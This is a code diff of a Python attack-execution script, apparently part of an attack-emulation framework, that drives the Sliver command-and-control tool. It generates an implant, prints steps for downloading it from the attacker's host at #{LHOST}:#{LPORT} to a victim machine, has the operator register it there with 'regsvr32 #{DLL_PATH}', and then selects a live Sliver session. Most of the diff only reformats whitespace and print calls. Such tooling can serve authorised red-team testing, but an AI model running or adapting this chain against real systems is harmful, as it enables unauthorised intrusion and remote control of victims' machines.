@@ -1,14 +1,12 @@
+
 import asyncio
 import questionary
 from rich.console import Console
 from rich.prompt import Confirm
 from rich.panel import Panel
 from typing import Dict
-
 console = Console()
 user_params: Dict[str, str] = {}
-
-
 def print_welcome_message():
     console.print(
         Panel(
@@ -18,12 +16,8 @@ def print_welcome_message():
             expand=False,
         )
     )
-
-
 def print_finished_message(message="Command completed!😊", status="info"):
     console.print(f"[bold green][FINISHED][/bold green] {message}")
-
-
 def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
     styled_prompt = f"[bold bright_cyan]{prompt}[/]"
     return Confirm.ask(
@@ -31,16 +25,12 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
         default="y",
         choices=["y", "n"],
         show_default=False,
-    )
-
-
+    )      
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-
     config = load_config(config_file_path="aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
-
     sliver_executor = SliverExecutor(config=config)
 
     async def executor_sliver_implant_generation():
@@ -89,10 +79,8 @@ async def main():
                 "Step canceled. Please ensure you have completed the manual steps."
             )
             return
-
     await executor_sliver_implant_generation()
-    console.print(
-        """\
+    console.print("""\
         [bold green][MANUAL ACTION REQUIRED][/bold green]
         (This step needs human interaction and (temporarily) cannot be executed automatically)
         (On attacker's machine)
@@ -102,23 +90,20 @@ async def main():
         1. Open #{LHOST}:#{LPORT} in the browser
         2. Navigate to the path of the file on the attacker's machine
         3. Download the file to #{PATH}
-        """
-    )
+        """)
     confirm_action()
-    console.print(
-        """\
+    console.print("""\
         [bold green][MANUAL ACTION REQUIRED][/bold green]
         (This step needs human interaction and (temporarily) cannot be executed automatically)
         (On victim's machine, use PowerShell or Command Prompt)
         regsvr32 #{DLL_PATH}
-        """
-    )
+        """)
     confirm_action()
+
 
     # Sliver-session selection
     console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
     sliver_sessionid = await sliver_executor.select_sessions()
-
 
 if __name__ == "__main__":
     asyncio.run(main())
